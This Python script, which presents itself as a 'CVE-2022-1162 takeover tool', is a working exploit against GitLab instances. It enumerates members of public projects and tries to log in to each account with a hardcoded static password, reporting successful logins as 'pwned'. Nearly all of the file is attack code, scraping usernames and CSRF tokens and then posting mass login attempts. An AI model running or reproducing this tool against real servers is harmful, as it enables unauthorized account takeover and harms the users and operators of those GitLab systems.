
'''
 /$$                     /$$
|__/                    | $$
 /$$  /$$$$$$   /$$$$$$$| $$$$$$$   /$$$$$$  /$$   /$$ /$$$$$$$   /$$$$$$
| $$ /$$__  $$ /$$_____/| $$__  $$ /$$__  $$| $$  | $$| $$__  $$ /$$__  $$
| $$| $$  \ $$|  $$$$$$ | $$  \ $$| $$  \__/| $$  | $$| $$  \ $$| $$  \ $$
| $$| $$  | $$ \____  $$| $$  | $$| $$      | $$  | $$| $$  | $$| $$  | $$
| $$| $$$$$$$/ /$$$$$$$/| $$$$$$$/| $$      |  $$$$$$/| $$  | $$|  $$$$$$/
|__/| $$____/ |_______/ |_______/ |__/       \______/ |__/  |__/ \______/
    | $$
    | $$
    |__/

CVE-2022-1162 TAKEOVER TOOL
'''

from bs4 import BeautifulSoup, SoupStrainer
import httplib2
import urllib
import re
import sys
import json


takeoverpassword = '123qweQWE!@#000000000'
http = httplib2.Http()

def get_xrsf(url):
    endpoint = url + '/'
    keyword = 'authenticity_token'
    status, response = http.request(endpoint)

    for link in BeautifulSoup(response, 'html.parser', parse_only=SoupStrainer('input')):
        if link.get('name')  and  keyword in link.get('name'):
            return   {'code': str(link.get('value')), 'cookies': str(status['set-cookie'])}
    return False

def req(url):
    print('Exploring...')
    endpoint = url + '/explore'
    keyword = 'text-plain'
    status, response = http.request(endpoint)
    for link in BeautifulSoup(response, 'html.parser', parse_only=SoupStrainer('a')):
        if link.get('class')  and  keyword in link.get('class'):
            members(url, link.get('href'))

def members(url, endpoint):
    print("Finding members in project: ", endpoint)
    endpoint = url +endpoint + '/-/project_members'

    status, response = http.request(endpoint)
    for link in BeautifulSoup(response.decode(), 'html.parser', parse_only=SoupStrainer('div', {'class': "js-project-members-list-app"})):
        users = json.loads(link.get('data-members-data'))["user"]["members"]
        
        for user in users:
            user = user["user"]["username"]
            print('Member id found:' ,user, 'trying login')
            login(url, user, takeoverpassword)

    for link in BeautifulSoup(response.decode(), 'html.parser', parse_only=SoupStrainer('div', {'class': "js-project-members-list"})):
        users = json.loads(link.get('data-members-data'))["members"]
        for user in users:
            user = user["user"]["username"]
            print('Member id found:' ,user, 'trying login')
            login(url, user, takeoverpassword)

    for link in BeautifulSoup(response, 'html.parser', parse_only=SoupStrainer('a')):
        if link.get('class')  and  'js-user-link' in link.get('class'):
            user = re.findall("\d+", link.get('href'))[0]
            print('Member id found:' ,user, 'trying login')
            login(url, user, takeoverpassword)

def login(url, username, password):
    url_login = url + '/users/sign_in'
    respxrsf = get_xrsf(url)
    code = respxrsf["code"]
    cookies = respxrsf["cookies"]
    data = {
        'utf8':'✓',
        'authenticity_token':code,
        'user[login]':username,
        'user[password]':password,
        'user[remember_me]': 0

    }
    headers = {'Cookie': cookies, 'Content-type': 'application/x-www-form-urlencoded'}

    req = http.request(url_login,
        method="POST",
        headers=headers,
        body=urllib.parse.urlencode(data))[1]
    if 'invalid login or password' not in req.decode().lower():
        print(req.decode())
        print(url, username, password, 'pwned!!')
    else:
        print(url, username, 'wrong')


if __name__ == '__main__':
    url = sys.argv[1]
    print("Url selected: ", sys.argv[1])
    req(url)
